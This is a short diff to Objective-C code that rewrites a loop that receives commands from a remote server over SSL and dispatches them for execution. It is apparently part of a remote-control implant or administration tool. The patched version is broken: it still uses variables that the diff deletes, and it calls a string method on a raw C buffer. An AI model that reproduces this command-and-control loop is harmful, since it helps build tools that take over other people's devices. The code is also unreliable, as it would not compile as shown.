@@ -47,18 +47,12 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
-        NSData *jsonData = [[NSString stringWithFormat:@"%s", buffer] dataUsingEncoding:NSUTF8StringEncoding];
-        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
-        NSString *cmd = [jsonDict objectForKey:@"cmd"];
-        NSString *args = [jsonDict objectForKey:@"args"];
-        
-        ac1d_base->terminator = (char*)[[jsonDict objectForKey:@"term"] UTF8String];
-        NSArray *args_container = [args componentsSeparatedByString:@" "];
+        NSArray *args = [buffer componentsSeparatedByString:@" "];
         NSMutableArray *args_data = [NSMutableArray arrayWithArray:args_container];
         
         printf("%s", buffer);
         
-        if ([commands containsObject:cmd]) [ac1d_base send_command:cmd:args_data];
+        if ([commands containsObject:cmd]) [ac1d_base send_command:args];
         memset(buffer, '\0', 2048);
     }
 }
